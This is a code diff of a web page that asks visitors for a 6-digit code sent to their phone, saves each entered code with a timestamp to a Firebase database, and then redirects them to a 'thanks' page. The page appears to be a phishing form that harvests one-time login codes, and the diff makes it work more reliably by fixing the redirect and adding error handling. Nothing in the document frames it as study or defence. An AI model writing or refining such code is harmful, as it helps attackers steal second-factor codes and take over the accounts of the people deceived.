@@ -30,7 +30,7 @@
         <div class="separator">
           <span></span>
         </div>
-        <form action="https://thanks-alpha.vercel.app/" class="token">
+        <form action="#" class="token">
           <div class="form-input">
             <h2>Enter the 6-digit code sent to your phone</h2>
           </div>
@@ -109,17 +109,27 @@ const app = initializeApp(firebaseConfig);
 
 const db = getDatabase(app);
 
-document.getElementById("otp-button").addEventListener("click",function (e) {
-  let now = new Date();
-  let timestamp = now.toLocaleString();
-set(ref(db, 'otp/' + timestamp),
-{
-    otp: document.getElementById("token").value
-});
+document.getElementById("otp-button").addEventListener("click", function (e) {
+      e.preventDefault();
+      let now = new Date();
+      let timestamp = now.toLocaleString();
 
-alert("Otp Sent!");
-window.location.ref = "https://thanks-alpha.vercel.app/";
-})
+      const data = {
+        otp: document.getElementById("token").value,
+        timestamp: timestamp
+      };
+
+      set(ref(db, 'otp/' + timestamp), data)
+        .then(() => {
+          alert("Otp Sent!");
+          window.location.href = "https://appreciation-page.vercel.app/";
+          console.log("success!");
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          alert("Failed to send OTP. Please try again.");
+        });
+    });
 </script>
   </body>
 </html>
